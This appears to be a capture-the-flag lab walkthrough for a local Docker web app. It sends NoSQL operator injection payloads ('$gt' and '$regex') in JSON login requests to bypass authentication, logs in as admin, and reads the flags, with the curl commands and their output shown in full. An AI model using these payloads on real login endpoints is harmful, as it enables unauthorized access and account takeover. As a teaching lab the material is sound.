# Walkthrough

## Setup

```bash
docker compose up --build -d
until nc -z -w2 127.0.0.1 8085 2>/dev/null; do sleep 2; done && echo "ready"
```

## Normal login

```bash
curl -s -c /tmp/cookies.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"hunter2"}' \
    http://127.0.0.1:8085/login
```

```
200
```

## Confirm operator injection

```bash
curl -s -c /tmp/inject.txt \
    -H 'Content-Type: application/json' \
    -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
    http://127.0.0.1:8085/login
```

```json
{"ok": true, "role": "user", "username": "alice"}
```

## Get flag 1

```bash
curl -s -b /tmp/inject.txt http://127.0.0.1:8085/dashboard
```

```json
{"flag": "POC{...}", "message": "Hello, alice."}
```

## Log in as admin via regex injection

```bash
curl -s -c /tmp/admin.txt \
    -H 'Content-Type: application/json' \
    -d '{"username":{"$regex":"^admin$"},"password":{"$gt":""}}' \
    http://127.0.0.1:8085/login
```

```json
{"ok": true, "role": "admin", "username": "admin"}
```

## Get flag 2

```bash
curl -s -b /tmp/admin.txt http://127.0.0.1:8085/admin
```

```json
{"flag": "POC{...}", "message": "Admin panel.", "users": [...]}
```

## Teardown

```bash
docker compose down
```
